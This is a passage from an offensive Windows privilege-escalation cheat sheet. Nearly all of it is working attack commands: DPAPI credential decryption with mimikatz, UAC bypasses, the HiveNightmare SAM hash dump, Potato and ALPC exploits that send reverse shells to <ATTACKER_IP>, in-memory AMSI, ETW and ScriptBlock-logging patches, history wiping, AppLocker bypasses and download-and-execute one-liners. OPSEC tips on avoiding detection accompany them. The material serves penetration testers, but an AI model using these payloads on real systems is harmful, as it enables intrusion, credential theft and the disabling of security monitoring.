  -ErrorAction SilentlyContinue | Select-String '01000000d08c9ddf' -List | Select Path

# === Decrypt — must run as the user that created it (per-user DPAPI master key) ===
# Form 1: ConvertFrom-SecureString output (single-line ciphertext)
$string = Get-Content '<PATH_TO_SECURESTRING_FILE>'
$pass   = $string | ConvertTo-SecureString
$cred   = New-Object System.Management.Automation.PSCredential('<USERNAME>', $pass)
$cred.GetNetworkCredential() | Format-List UserName, Password, Domain

# Form 2: Export-CliXml (full PSCredential object serialized)
$cred = Import-Clixml '<PATH>.xml'
$cred.GetNetworkCredential().Password
```

> **Tip:** Check `schtasks /query /xml ALL` and `Get-ScheduledTask | Get-ScheduledTaskInfo` — task XMLs sometimes reference the `.xml` cred file path, telling you which user/account context can decrypt it.

##### Cross-user pivot — decrypt SecureString XML created by another user

When the file was written by a different user (e.g. service account), recover their DPAPI master key first.

```cmd
:: Locate the target user's master keys
dir /a "C:\Users\<TARGET_USER>\AppData\Roaming\Microsoft\Protect\<SID>"
```

```text
mimikatz # privilege::debug
:: As SYSTEM — dumps cached master keys from LSASS (any logged-on user)
mimikatz # sekurlsa::dpapi

:: Or decrypt master key offline with the user's password / NT hash
mimikatz # dpapi::masterkey /in:"C:\Users\<TARGET_USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MK_GUID>" /sid:<SID> /password:<PASSWORD>
mimikatz # dpapi::masterkey /in:"<MK_FILE>" /sid:<SID> /hash:<NT_HASH>

:: Decrypt the SecureString blob with the recovered master key
mimikatz # dpapi::blob /in:<BLOB_FILE> /masterkey:<MK_HEX>
```

```powershell
# https://github.com/GhostPack/SharpDPAPI
.\SharpDPAPI.exe blob /target:<PATH_TO_XML> /mkfile:masterkeys.txt
.\SharpDPAPI.exe triage           # auto-find blobs + master keys for current/all users
```

##### Use the recovered credential

```powershell
$pass = ConvertTo-SecureString '<RECOVERED_PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $pass)
New-PSSession -ComputerName <TARGET> -Credential $cred -Authentication CredSSP | Enter-PSSession
Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock { whoami /all }
```

> **OPSEC:** Reading the `.xml` is non-destructive and leaves no obvious telemetry beyond standard file-access events. Don't modify or delete the artifact — copy to a working dir and read from there.

> **LOTL caveat:** No external tooling required for the same-user case — `Import-Clixml` and `ConvertTo-SecureString` are both built-in PowerShell. Cross-user decryption requires SharpDPAPI / mimikatz.

---

### 4.8 UAC Bypass
```powershell
# Check UAC settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# Value 0 = No prompt, 2 = Prompt on secure desktop, 5 = Prompt (default)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# Value 0 = UAC disabled entirely

# === NATIVE UAC BYPASSES (no tools needed) ===

# fodhelper.exe bypass (Windows 10+ — most reliable native bypass)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
# Cleanup:
reg delete HKCU\Software\Classes\ms-settings /f

# computerdefaults.exe bypass (Windows 10+)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
computerdefaults.exe
reg delete HKCU\Software\Classes\ms-settings /f

# sdclt.exe bypass (Windows 10 — Backup and Restore)
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /f
sdclt.exe
reg delete "HKCU\Software\Classes\Folder" /f

# eventvwr.exe bypass (Windows 7/8/10)
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f

# === TOOL-BASED ===
# UACME — collection of UAC bypass methods
# https://github.com/hfiref0x/UACME
.\Akagi64.exe <METHOD_NUMBER> "C:\temp\shell.exe"

# === SystemPropertiesAdvanced.exe + srrstr.dll DLL Hijack (auto-elevated) ===
# SystemPropertiesAdvanced.exe is auto-elevated (high IL without UAC prompt).
# It loads srrstr.dll from PATH dirs; if WindowsApps is in user PATH and writable:
$env:PATH -split ';' | Where-Object { $_ -match 'WindowsApps' } | ForEach-Object { icacls $_ }
# Confirm writable → drop DLL:
copy C:\Windows\Temp\<PAYLOAD>.dll "$env:LOCALAPPDATA\Microsoft\WindowsApps\srrstr.dll"
# Trigger — auto-elevates, loads our DLL at high IL
SystemPropertiesAdvanced.exe
```

### 4.9 Kernel & System Exploits
```powershell
# Check OS version and patch level
systeminfo
wmic qfe list brief

# Common kernel exploits:
# MS16-032 — Secondary Logon (Win 7/8.1/10, Server 2008/2012)
# MS15-051 — Win32k.sys (Win 7/8, Server 2008/2012)
# CVE-2021-1732 — Win32k EoP (Windows 10 / Server 2019)
# CVE-2021-36934 (HiveNightmare) — SAM readable by non-admin
```

#### 4.9.1 Patch-aware LPE matching — WES-NG (offline on Kali)

Run `systeminfo` on target, exfil, match against the WES-NG database on Kali. The database tracks every Microsoft Security Update + ExploitDB cross-reference; daily-updated, no live network calls during matching.

```powershell
# On target — CSV output is locale-safe (default systeminfo localizes "Hotfix(s):" header)
systeminfo /FO CSV > C:\Windows\Temp\sys.csv
# OR — recon.ps1 already writes systeminfo_csv.txt to the loot dir
```

```bash
# On Kali — one-time install + DB refresh
pipx install wesng
wes.py --update

# Match against the exfiltrated systeminfo
wes.py sys.csv -e -i 'Important' --output wes_critical.txt
#  -e               only CVEs with public exploit (ExploitDB / MSF / GitHub)
#  -i 'Important'   filter to Important-or-higher severity
#  --output         CSV-style report
```

Output columns: CVE | KB | Severity | Title | Exploit-status | URL. Map each `[+]` flagged CVE back to the relevant subsection here (e.g. CVE-2021-36934 → §4.9 HiveNightmare; MS17-010 → §2.6).

#### 4.9.2 PoC compilation toolchain — cross-compile on Kali or build on target

Most ExploitDB / GitHub LPE PoCs ship as raw `.cpp` / `.c` and need compiling before drop. Cross-compile from Kali with mingw-w64 (no compiler artifacts on target), or use MSVC on the target itself when offline.

```bash
# Kali — cross-compile x64 PE with mingw-w64 (apt: mingw-w64)
x86_64-w64-mingw32-g++ exploit.cpp -o poc.exe -lws2_32 -ladvapi32 -lshlwapi -static
#  -static       statically link libstdc++/libgcc — single self-contained binary, no DLL deps on target
#  -lws2_32      Winsock (sockets, reverse-shell PoCs)
#  -ladvapi32    tokens / services / registry (most LPE PoCs)
#  -lshlwapi     path / string helpers (common in token-abuse PoCs)

# 32-bit variant (older CVEs, Wow64 targets)
i686-w64-mingw32-g++ exploit.cpp -o poc32.exe -lws2_32 -ladvapi32 -lshlwapi -static

# Plain C PoC (most kernel exploits)
x86_64-w64-mingw32-gcc exploit.c -o poc.exe -lws2_32 -ladvapi32 -static
```

```cmd
:: Target — MSVC build (when target has VS Build Tools and you need ABI-exact match)
:: Common when mingw cross-compile triggers EDR heuristics on the binary
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cl exploit.cpp /EHsc /MT /Fe:poc.exe /link Advapi32.lib Shlwapi.lib Ws2_32.lib
::  /EHsc         standard C++ exception handling
::  /MT           static CRT — no vcruntime DLL dependency
::  /Fe:          output exe name
::  /link         pass libs to linker

:: 32-bit on x64 host
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars32.bat"
cl exploit.cpp /EHsc /MT /Fe:poc32.exe /link Advapi32.lib Shlwapi.lib Ws2_32.lib
```

> **Tip:** Cross-compile on Kali by default — keeps the target clean of compiler artifacts and lets you iterate quickly. Fall back to on-target MSVC only when the PoC uses Windows-SDK-specific headers that mingw lacks (rare — DDK/WDK kernel PoCs are the usual case).

> **OPSEC:** mingw-built binaries have distinctive PE characteristics (specific section names, GCC-style imports) that some EDRs flag heuristically. If the dropped PoC gets quarantined despite a working bypass, rebuild with MSVC on a dev VM and recompare.

#### 4.9.3 Legacy Windows kernel LPE chain — XP / 2003 / 2008 / x86

> **Precondition:** legacy Windows targets (XP / 2003 / 2008 / x86) where an IIS 6 / WebDAV / SQL 2000 foothold lands as NETWORK SERVICE or IUSR. Kernel exploit escalates to SYSTEM. Always confirm OS arch first — x86 PoC on x86 host, x64 on x64.

```cmd
wmic os get osarchitecture
systeminfo
wmic qfe list brief
```

CVEs: MS14-058 TrackPopupMenu, MS14-070 TCP/IP IOCTL, MS15-051 ClientCopyImage, MS16-032 Secondary Logon, Hot/Rotten Potato (NBNS+WPAD+NTLM relay, MS16-075/MS16-077).

```bash
i686-w64-mingw32-gcc exploit.c -o poc_x86.exe -lws2_32 -ladvapi32 -static
x86_64-w64-mingw32-gcc exploit.c -o poc_x64.exe -lws2_32 -ladvapi32 -static
```

```cmd
C:\Windows\Temp\poc_x86.exe
whoami
```

#### 4.9.4 HiveNightmare / SeriousSAM — CVE-2021-36934
```powershell
# Check if SAM is readable by non-admin (Windows 10 1809+, Server 2019+)
icacls C:\Windows\System32\config\SAM
# If BUILTIN\Users has (I)(RX) access → vulnerable!

# Extract shadow copies
vssadmin list shadows
# Copy SAM, SYSTEM, SECURITY from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\SECURITY

# Extract hashes on attacker machine
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

#### 4.9.5 2025–2026 Windows Kernel LPE CVEs

```powershell
# Check patch level for recent kernel LPEs
systeminfo | findstr /i "KB"
wmic qfe list brief | sort /r

# === CVE-2025-62215 — Kernel Double-Free Race Condition ===
# Windows 10/11, Server 2019/2022. Actively exploited in the wild (Nov 2025).
# Race condition in win32k subsystem → SYSTEM from any user.
# Check: missing KB from November 2025 Patch Tuesday
Get-HotFix | Where-Object { $_.InstalledOn -gt "2025-11-01" }

# === CVE-2026-24289 — Kernel Use-After-Free (March 2026) ===
# Windows Kernel UAF → local SYSTEM escalation.
# Affects Windows 10 22H2+, Windows 11, Server 2022+.
# Check: missing March 2026 cumulative update

# === CVE-2026-33841 / CVE-2026-35420 / CVE-2026-40369 — Kernel EoP (May 2026) ===
# Multiple kernel EoP vulns patched in May 2026 Patch Tuesday.
# CVSS 7.8, all "Important" severity.
# Check: system not updated since May 2026

# Quick version check
[System.Environment]::OSVersion.Version
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
```

#### 4.9.6 BlueHammer — Windows Component Interaction LPE (April 2026)
```powershell
# No CVE assigned. Uses legitimate Windows API interactions → SYSTEM.
# Affects Windows 10/11, Server 2019/2022. Standard user sufficient.

# Pre-check: confirm target OS
[System.Environment]::OSVersion.Version
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion

# Public PoC: search "BlueHammer LPE" — download and execute
.\BlueHammer.exe
# Returns SYSTEM shell if vulnerable
```

#### 4.9.7 ALPC Task Scheduler LPE — CVE-2018-8440 (SandboxEscaper)

> **Tip:** Pre-Sep-2018 hosts only (≤ Win10 1803 / Server 2016 unpatched). On modern targets prefer GodPotato / PrintSpoofer when `SeImpersonate` is present. Reach for ALPC when no token privileges are available **and** the target is genuinely pre-2018-patched.

```powershell
# === Pre-flight: confirm vulnerable patch level + ACL precondition ===
# 1. systeminfo — look for OS Build <= 17134 (1803) and absence of KB4457128 / KB4457138
systeminfo | Select-String -Pattern "OS Name","OS Version","Hotfix"
wmic qfe list brief | findstr /i "KB4457"

# 2. Authenticated Users must have (RX,WD) on C:\Windows\Tasks for the hardlink primitive
icacls C:\Windows\Tasks
# Vulnerable: BUILTIN\Users:(RX,WD) or NT AUTHORITY\Authenticated Users:(RX,WD)

# 3. DiagHub service running (used to load the DLL as SYSTEM via ALPC + diaghub combo)
Get-Service -Name diagsvc
```

```bash
# === Build payload DLL on Kali (mingw-w64) ===
# Stub: revShell() in DllMain → cmd.exe over socket back to <ATTACKER_IP>:<ATTACKER_PORT>
sudo apt install -y mingw-w64
x86_64-w64-mingw32-g++ payload.cpp -o payload.dll -lws2_32 -shared
```

```cmd
:: === Get the alpc-diaghub exploit (combines ALPC LPE + DiagHub DLL load) ===
:: # https://github.com/realoriginal/alpc-diaghub
:: # Original SandboxEscaper PoC: https://github.com/SandboxEscaper/randomrepo
:: Drop alpc.exe + payload.dll + a dummy .rtf onto the target

:: === Trigger from the unprivileged shell ===
alpc.exe payload.dll .\dummy.rtf
:: # alpc.exe arms the SchRpcSetSecurity primitive to grant write on a hard-linked
:: # Tasks file, then DiagHub service-load triggers payload.dll → revShell as SYSTEM
```

```bash
# === Catch the SYSTEM callback on the attacker ===
rlwrap nc -lvnp <ATTACKER_PORT>
# whoami should print: nt authority\system
```

> **OPSEC:** Loud — DiagHub service load + DLL touched in `%SystemRoot%\Tasks` produces 4688 + Sysmon 7. On a detection-validation engagement this is exactly what blue team should fire on.

---

#### 4.9.8 SeAssignPrimaryTokenPrivilege Exploitation

```powershell
# Check for the privilege
whoami /priv | findstr /i "SeAssignPrimaryToken"
# Commonly found on: IIS AppPool accounts, MSSQL service, NETWORK SERVICE

# Potato-family attacks that leverage SeAssignPrimaryToken:
# These work because the attacker can assign a SYSTEM token to a new process

# JuicyPotato (Server 2016/2019, Win 10 pre-1809)
.\JuicyPotato.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe <ATTACKER_IP> <PORT>" -t *
# Requires a valid CLSID — find one: https://ohpe.it/juicy-potato/CLSID/

# JuicyPotatoNG (Server 2019/2022, Win 10 1809+/11)
.\JuicyPotatoNG.exe -t * -p "C:\temp\nc.exe" -a "<ATTACKER_IP> <PORT> -e cmd.exe"
# Automatically finds a working COM server — no CLSID hunt needed

# RoguePotato (Server 2019+, requires external OXID resolver)
# 1. On attacker: socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999
# 2. On target:
.\RoguePotato.exe -r <ATTACKER_IP> -e "cmd /c C:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe" -l 9999

# GodPotato (most universal — Server 2012–2022, Win 8.1–11)
.\GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
```

```powershell
# === LOTL alternative — no potato binary needed ===
# If you have SeAssignPrimaryToken + SeImpersonate together,
# you can use the built-in Windows service control manager:

# 1. Create a service that runs your payload as SYSTEM
# 🔴 sc create + non-svchost binPath = EID 7045 (new service installed) + EID 4697; marker-named so it's a transient (create→start→fail→delete), not persistence — engagement-validation only
# Marker-named — this is transient (create→start→fail→delete), not persistence.
sc.exe create engagement-test-<TS> binPath= "cmd /c C:\Windows\Temp\engagement-test-<TS>.exe <ATTACKER_IP> <PORT> -e cmd.exe" type= own start= demand
sc.exe start engagement-test-<TS>
sc.exe delete engagement-test-<TS>
# Service will fail but the command executes as SYSTEM — delete immediately after.

# 2. Scheduled task (runs as SYSTEM by default when created by admin)
# Marker-named, single-fire, deleted immediately — not persistence.
schtasks /create /tn "engagement-test-<TS>" /tr "cmd /c C:\Windows\Temp\engagement-test-<TS>.exe <ATTACKER_IP> <PORT> -e cmd.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /run /tn "engagement-test-<TS>"
schtasks /delete /tn "engagement-test-<TS>" /f

# Note: sc.exe and schtasks approaches require local admin context,
# while potato attacks work from service accounts with just the token privileges
```

### 4.10 AMSI & ETW Bypass (Critical for PowerShell Tooling)

> **Without AMSI bypass, most PowerShell-based tools (PowerView, Rubeus, PowerUp, SharpHound) will be detected and blocked. This is a CRITICAL first step after getting a shell.**

```powershell
# Check if AMSI is active
"AmsiInitFailed"    # If this triggers AV → AMSI is active

# Method 1: One-liner AMSI patch (patch amsi.dll in memory)
# NOTE: This specific bypass is signature-detected on fully patched Win 10/11 and Server 2022+
# If it triggers AV, use amsi.fail for fresh obfuscated variants, or use Method 2/4 below
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b=$a.GetField('am'+'siInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Method 2: Reflection-based bypass
[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siContext','NonPublic,Static').GetValue($null),0x05)

# Method 3: Using PowerShell downgrade (v2 has no AMSI)
powershell -version 2 -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')"
# Check if v2 is available: Get-Host | Select-Object Version
# PowerShell v2 requires .NET Framework 2.0: dir C:\Windows\Microsoft.NET\Framework\v2*

# Method 4: amsi.fail — generate obfuscated bypasses online
# https://amsi.fail

# Method 5: String concatenation / obfuscation in scripts to avoid signatures
# Tick/backtick split tokens (PS ignores them):
#   Invoke-Mimikatz → In`vo`ke-Mi`mi`ka`tz
#   AmsiScanBuffer  → Am`siScanBuffer
# String concat:
#   amsiutils       → ('am'+'siutils')
#   AmsiScanBuffer  → ('Am'+'siScan'+'Buffer')
# Reverse + invert:
$s = 'reffuBnacSismA'
-join($s[-1..-($s.length)])   # Builds 'AmsiScanBuffer' at runtime

# Method 6: AmsiScanBuffer memory patch (rasta-mouse classic) — patches amsi.dll directly via Add-Type P/Invoke
# Full code: https://github.com/rasta-mouse/AmsiScanBufferBypass (load as byte array, reflective)
# Short version (overwrites AmsiScanBuffer prologue with mov eax,0x80070057; ret):
$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
$lib = [Win32]::LoadLibrary("am"+"si.dll")
$addr = [Win32]::GetProcAddress($lib, "Am"+"siScanBuffer")
$patch = [Byte[]] (0xB8,0x57,0x00,0x07,0x80,0xC3)
$p = 0; [Win32]::VirtualProtect($addr, [uint32]$patch.Length, 0x40, [ref]$p) | Out-Null   # MUST be patch.Length (6), not 5
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)

# Method 7: AMSI provider unregister (requires admin)
# Deletes AMSI provider COM registration — Defender won't call AMSI at all
Reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f

# Method 8: amsi.dll hijack (requires write to program directory or DLL search-order abuse)
# Drop a fake amsi.dll next to PowerShell.exe → LoadLibrary picks it up before SysWOW64
# Fake DLL exports AmsiScanBuffer/AmsiInitialize returning S_FALSE

# === ETW (Event Tracing for Windows) Bypass ===
# ETW logs PowerShell activity even after AMSI bypass — disable it too
# Patch ETW provider to prevent logging:
[Reflection.Assembly]::LoadWithPartialName('System.Core')
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

# === ScriptBlock Logging Bypass (different from ETW!) ===
# ScriptBlock logging (Event ID 4104) is configured via registry/GPO and logs script content
# independently of ETW. Check if enabled:
Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue

# Reflection-based disable. Field name changed in PS 5.1 ≥ KB5005408 (Aug 2021):
#   cachedGroupPolicySettings  → pre-KB5005408
#   s_cachedGroupPolicySettings → post-KB5005408 (most patched Win10/11/Server 2019+)
$utils = [ref].Assembly.GetType('System.Management.Automation.Utils')
$field = $utils.GetField('s_cachedGroupPolicySettings','NonPublic,Static')
if (-not $field) { $field = $utils.GetField('cachedGroupPolicySettings','NonPublic,Static') }
$GroupPolicySettings = $field.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0

# Clear in-memory command history after activity
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# === Related: Constrained Language Mode (CLM) ===
# If $ExecutionContext.SessionState.LanguageMode -eq 'ConstrainedLanguage' → AMSI bypasses that use
# Add-Type / reflection will fail. See 4.11 for CLM bypass (requires separate bypass first).
$ExecutionContext.SessionState.LanguageMode    # Check before attempting memory-patch bypasses

# After AMSI + ETW bypass, load tools normally:
Import-Module .\PowerView.ps1
Import-Module .\PowerUp.ps1
```

**Technique → Defender version awareness:**
| Method | Signature detection status (as of current Defender) |
|--------|---|
| 1 (amsiInitFailed field) | DETECTED — use only as fallback |
| 2 (amsiContext write) | DETECTED |
| 6 (AmsiScanBuffer patch) | Works if byte patch is obfuscated; raw source is detected |
| 7 (provider unregister) | Not signature-based — works but requires admin + auditable |
| PS v2 downgrade (3) | Works if v2 engine present; being removed from newer Windows |
| Obfuscation (5) | Depends on obfuscation quality — use amsi.fail / Invoke-Obfuscation |

### 4.11 AppLocker / Constrained Language Mode (CLM) Bypass

```powershell
# Check if in Constrained Language Mode
$ExecutionContext.SessionInformation.LanguageMode
# "ConstrainedLanguage" = restricted, "FullLanguage" = normal

# Check AppLocker policy
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Bypass Method 1: InstallUtil (native .NET LOLBin)
# Compile C# reverse shell with [System.ComponentModel.RunInstaller(true)]
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\shell.exe

# Bypass Method 2: MSBuild (native .NET LOLBin)
# Create .csproj/.xml with inline C# task containing shellcode
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\temp\payload.xml

# Bypass Method 3: Writable AppLocker exceptions
# Check for writable directories that are whitelisted:
# C:\Windows\Temp, C:\Windows\Tasks, C:\Windows\System32\spool\drivers\color
# C:\Windows\tracing
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
icacls C:\Windows\System32\spool\drivers\color

# Copy executable to whitelisted writable directory
copy C:\temp\shell.exe C:\Windows\Tasks\shell.exe
C:\Windows\Tasks\shell.exe

# Bypass Method 4: PowerShell CLM escape via .exe
# Compile a C# assembly that runs PowerShell in FullLanguage:
# https://github.com/padovah4ck/PSByPassCLM

# Bypass Method 5: PowerShell runspace via C# (avoid CLM entirely)
# SharpPick, PSLess, or custom C# binaries that call System.Management.Automation
```

#### 4.11.1 AppLocker Bypass via Alternative PowerShell Binary Paths

AppLocker rules often whitelist `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` by path or publisher but miss other PS binaries on the system. Enumerate every copy of `powershell.exe`, `pwsh.exe`, and the `System.Management.Automation.dll` runtime, then invoke the path the policy forgot.

```cmd
:: Enumerate every PS binary and the SMA runtime
dir /B /S C:\Windows\powershell.exe
dir /B /S C:\Windows\pwsh.exe
dir /B /S "C:\Program Files\PowerShell\pwsh.exe"
dir /B /S C:\Windows\system.management.automation.dll

:: Common hits when System32 path is blocked but others pass:
::   C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe          (32-bit PS — frequently missed)
::   C:\Windows\WinSxS\amd64_microsoft-windows-powershell-exe_*\powershell.exe
::   C:\Windows\WinSxS\wow64_microsoft-windows-powershell-exe_*\powershell.exe
::   C:\Program Files\PowerShell\7\pwsh.exe                              (PS 7+ — different publisher cert)
::   C:\Windows\assembly\GAC_MSIL\System.Management.Automation\*\System.Management.Automation.dll
```

```powershell
# 32-bit Windows PowerShell when 64-bit System32 path is the only one whitelisted
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc <BASE64_PAYLOAD>

# WinSxS PowerShell copy
C:\Windows\WinSxS\amd64_microsoft-windows-powershell-exe_*\powershell.exe -NoP -Enc <BASE64_PAYLOAD>

# pwsh.exe (PowerShell 7+) — rules scoped to Windows PowerShell publisher cert do not match
& "C:\Program Files\PowerShell\7\pwsh.exe" -NoP -Enc <BASE64_PAYLOAD>

# Verify bypass — should report FullLanguage in the new session
$ExecutionContext.SessionState.LanguageMode
```

##### Living-off-the-land alternative — host the PS runtime without powershell.exe

Custom unmanaged hosts call `PowerShell.Create()` against `System.Management.Automation.dll` directly, never spawning a binary AppLocker recognizes as PowerShell.

```powershell
# https://github.com/Ben0xA/nps         (NoPowerShell — managed C# host)
# https://github.com/padovah4ck/PSByPassCLM
.\nps.exe "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/<APP_PATH>')"

# Custom C# host loading SMA.dll from the GAC
Add-Type -Path 'C:\Windows\assembly\GAC_MSIL\System.Management.Automation\*\System.Management.Automation.dll'
[System.Management.Automation.PowerShell]::Create().AddScript('<PAYLOAD>').Invoke()
```

> **OPSEC:** Bypassing the AppLocker path/publisher check does NOT bypass Module/Script Block logging or AMSI — those hook the runtime, not the binary. Pair with AMSI/ETW patches from §4.10 before running real payloads.

---

### 4.11b JEA (Just Enough Administration) Endpoint Enumeration & Abuse

JEA constrains PowerShell sessions to a whitelist of cmdlets/functions via `.psrc` Role Capability files. Misconfigurations in the allowed command set allow escaping to full language mode or executing arbitrary code as the virtual RunAs account (often SYSTEM-equivalent).

```powershell
# === ENUMERATE JEA ENDPOINTS ===
# List all registered PS session configurations (JEA endpoints have custom names)
Get-PSSessionConfiguration | Format-Table Name, RunAsUser, Permission -AutoSize

# Identify non-default endpoints (Microsoft.PowerShell / microsoft.powershell32 are default)
Get-PSSessionConfiguration | Where-Object { $_.Name -notmatch '^microsoft\.' }

# Check if current user can connect to a JEA endpoint
$ep = '<JEA_ENDPOINT_NAME>'
Get-PSSessionConfiguration -Name $ep | Select-Object Name, Permission, RunAsVirtualAccount, RunAsVirtualAccountGroups

# Connect to the JEA endpoint
Enter-PSSession -ComputerName <TARGET> -ConfigurationName $ep -Credential $cred
# Or locally:
Enter-PSSession -ComputerName localhost -ConfigurationName $ep
```

```powershell
# === ENUMERATE ALLOWED COMMANDS INSIDE JEA SESSION ===
# Once connected to the JEA endpoint:
Get-Command                              # lists all available cmdlets/functions
Get-Command | Measure-Object             # count — small list = tight JEA
Get-Command -CommandType Function        # custom functions defined in .psrc
$ExecutionContext.SessionState.LanguageMode  # NoLanguage / ConstrainedLanguage / RestrictedLanguage
```

```powershell
# === LOCATE .psrc / .pssc FILES ON DISK (from a separate admin shell) ===
# Role Capability files define allowed commands
Get-ChildItem -Path 'C:\Program Files\WindowsPowerShell\Modules' -Recurse -Filter *.psrc
Get-ChildItem -Path 'C:\Windows\System32\WindowsPowerShell\v1.0\Modules' -Recurse -Filter *.psrc

# Session Configuration files define endpoint settings
Get-ChildItem -Path "$env:ProgramData\JEAConfiguration" -Recurse -Filter *.pssc -ErrorAction SilentlyContinue
Get-ChildItem -Path 'C:\Windows\System32\WindowsPowerShell\v1.0\SessionConfig' -Filter *.pssc -ErrorAction SilentlyContinue

# Read the .psrc to see VisibleCmdlets, VisibleFunctions, VisibleExternalCommands
Get-Content '<PATH_TO>.psrc'
```

```powershell
# === JEA ESCAPE TECHNIQUES ===

# Escape 1: If Set-Content / Add-Content / Out-File is allowed — write a script and execute
# (works because file-write cmdlets can create .ps1 that runs outside JEA)
Set-Content -Path C:\Windows\Temp\escape.ps1 -Value 'whoami > C:\Windows\Temp\jea_proof.txt'
# Then trigger via scheduled task or another allowed command

# Escape 2: If Start-Job / Start-Process is in the allowed list
Start-Process cmd.exe -ArgumentList '/c whoami > C:\Windows\Temp\jea_proof.txt'

# Escape 3: Function definition within the JEA session (if LanguageMode allows it)
function Invoke-Escape { & cmd.exe /c "C:\Windows\Temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe" }
Invoke-Escape

# Escape 4: If Invoke-Command is allowed — target localhost outside JEA
Invoke-Command -ComputerName localhost -ScriptBlock { whoami /all }

# Escape 5: If a visible cmdlet accepts -ScriptBlock or -ArgumentList that gets eval'd
# Example: allowed cmdlet with -Command / -ScriptBlock parameter
<ALLOWED_CMDLET> -ScriptBlock { whoami > C:\Windows\Temp\jea_proof.txt }

# Escape 6: RunAsVirtualAccount = SYSTEM-equivalent — any writable escape = instant LPE
# JEA virtual accounts are members of local Administrators by default
```

#### Living-off-the-land / LOTL variant

```powershell
# Pure enumeration with no tools — works from any PS session
Get-PSSessionConfiguration | Format-List Name, RunAsUser, RunAsVirtualAccount, Permission
# Try connecting to each non-default endpoint
foreach ($cfg in (Get-PSSessionConfiguration | Where-Object { $_.Name -notmatch '^microsoft\.' })) {
    try {
        $s = New-PSSession -ConfigurationName $cfg.Name -ComputerName localhost -ErrorAction Stop
        Write-Output "[+] Connected to $($cfg.Name) — enumerating commands..."
        Invoke-Command -Session $s -ScriptBlock { Get-Command | Select-Object Name,CommandType }
        Remove-PSSession $s
    } catch {
        Write-Output "[-] Cannot connect to $($cfg.Name): $($_.Exception.Message)"
    }
}
```

### 4.11c WoW64 Filesystem Redirection Escape (32-bit to 64-bit Shell)

When initial access lands in a 32-bit process (x86 web shell, 32-bit msfvenom payload, WoW64 IIS AppPool), system utilities and DLLs resolve to `C:\Windows\SysWOW64` instead of the real `System32`. Many privesc tools and exploits require 64-bit context. Detect and escape via `Sysnative`.

```cmd
